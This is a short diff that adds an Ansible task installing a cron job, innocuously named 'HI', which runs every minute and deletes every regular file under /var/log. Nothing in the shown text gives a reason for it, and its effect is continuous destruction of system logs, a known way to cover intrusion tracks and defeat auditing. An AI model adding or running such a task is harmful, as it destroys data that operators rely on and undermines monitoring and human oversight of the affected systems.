@@ -1,0 +1,9 @@
+- name: Ensure the cron job is present
+  cron:
+    name: "HI"
+    minute: "*"
+    hour: "*"
+    day: "*"
+    month: "*"
+    weekday: "*"
+    job: "/bin/bash -c 'for file in /var/log/*; do [ -f \"$file\" ] && /bin/rm -f \"$file\"; done'"
